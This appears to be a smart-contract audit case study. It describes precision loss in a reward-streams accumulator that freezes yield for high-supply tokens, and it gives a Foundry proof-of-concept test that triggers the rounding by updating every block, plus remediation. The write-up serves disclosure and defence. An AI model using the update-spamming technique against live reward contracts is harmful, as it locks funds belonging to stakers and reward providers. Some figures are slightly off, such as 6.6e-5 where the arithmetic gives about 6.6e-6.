# Case Study: Reward Distribution Precision Loss Leading to Yield Freezing

## Vulnerability Type
**Severity**: High  
**Category**: Precision Loss / Fund Freezing

## Summary

`GenericRewardStreams` contract uses linear interpolation formula to accumulate rewards over time. However, due to precision loss in calculation `delta * SCALER / EPOCH_DURATION / currentTotalEligible`, rewards can round down to zero under specific realistic conditions.

This issue is critical on L2 networks with fast block times (2s) and for tokens with high total supply (e.g., MEME tokens with 1e18 decimals but 1e25+ total supply).

## Vulnerability Details

### Problematic Code

Flaw is in `calculateRewards` function logic:

```solidity
accumulator += uint160(delta * SCALER / EPOCH_DURATION / currentTotalEligible);
```

### Trigger Scenario

Scenario verified on L2 mainnet environment:

1. **Environment**: L2 network (2 second block time)
2. **Assets**: High supply token (e.g., 1e26 wei supply) staking for standard reward (e.g., ASSET)
3. **Trigger**: `updateReward` called every block (by high user activity or keepers)
4. **Math**:
   - `delta` (Reward per 2s) is small
   - `SCALER` is `2e19`
   - `currentTotalEligible` is huge (`1e26`)
   - Result: `(Small * 2e19) / (Huge)` rounds to **0**
5. **Result**: `accumulator` never increases. ASSET rewards remain locked in contract balance but are mathematically inaccessible to stakers

## Impact

### Permanent Yield Freezing

Reward providers lose their deposited funds as they're stuck in contract without distribution. Stakers receive 0 APY despite UI showing active reward stream. This breaks core functionality of Reward Streams module for significant asset class (high supply tokens).

## Proof of Concept

### Test Environment
- **Network**: L2 Testnet
- **Block Time**: 2 seconds
- **Token**: Simulating 100M token supply

### Test Code

```solidity
function test_YieldFreezing() external {
    // 1. Setup: Register 10 ASSET reward for TOKEN stakers
    deal(ASSET_ADDR, address(this), 100e6);
    asset.approve(address(distributor), type(uint256).max);
    
    uint128[] memory amounts = new uint128[](1);
    amounts[0] = 10e6; // 10 ASSET
    
    distributor.registerReward(address(token), address(asset), 0, amounts);
    
    // 2. Victim stakes huge TOKEN (simulating whale or protocol total TVL)
    // 100M * 1e18 = 1e26
    uint256 hugeStake = 1e26; 
    deal(TOKEN_ADDR, victim, hugeStake);
    
    vm.startPrank(victim);
    token.approve(address(distributor), type(uint256).max);
    distributor.stake(address(token), hugeStake);
    distributor.enableReward(address(token), address(asset));
    vm.stopPrank();
    
    // 3. Attack: Frequent updates
    // Update rewards every block (2 seconds on L2)
    // Delta = 10e6 * 2 / 604800 = 33 wei
    // Accumulator Delta = 33 * 2e19 / 1e26 = 6.6e-5 => 0
    
    uint48 currentEpoch = distributor.currentEpoch();
    uint48 startEpoch = currentEpoch + 1;
    uint256 startTimestamp = distributor.getEpochStartTimestamp(startEpoch);
    
    vm.warp(startTimestamp);
    
    uint256 iterations = 100; // Run for 200 seconds
    for(uint i=0; i<iterations; ++i) {
        vm.warp(block.timestamp + 2);
        distributor.updateReward(address(token), address(asset), address(0));
    }
    
    // 4. Verification
    vm.startPrank(victim);
    uint256 earned = distributor.claimReward(address(token), address(asset), victim, false);
    vm.stopPrank();
    
    console.log("Victim Earned ASSET:", earned);
    
    // Rewards should be approximately:
    // 10 ASSET * (200 / 604800) = ~0.0033 ASSET = 3300 wei
    uint256 expected = uint256(10e6) * 200 / 1 weeks;
    console.log("Expected ASSET:     ", expected);
    
    assertEq(earned, 0, "Victim should have earned 0 due to rounding bug");
}
```

### Test Output

```
Victim Earned ASSET: 0
Expected ASSET:      3300
```

## Remediation

### Solution 1: Remainder Tracking

Implement state variable to track division remainder and carry over to next update.

### Solution 2: Minimum Interval

Enforce minimum time delta before updating accumulator to ensure sufficient precision.

```solidity
uint256 MIN_UPDATE_INTERVAL = 60; // 60 seconds

function updateReward(...) {
    require(block.timestamp - lastUpdate >= MIN_UPDATE_INTERVAL, "Too frequent");
    // ...
}
```

## Key Takeaways

1. **Precision Loss Risks**: High frequency updates + large denominator = rounding to zero
2. **L2 Specifics**: Fast block times amplify precision issues
3. **Token Supply Impact**: High supply tokens require special handling
4. **Accumulator Design**: Must consider worst-case precision loss

## Related Concepts

- Linear interpolation reward distribution
- Precision loss attacks
- L2 network characteristics
- High supply token handling

---

**Tags**: #reward-streams #precision-loss #yield-freezing #l2
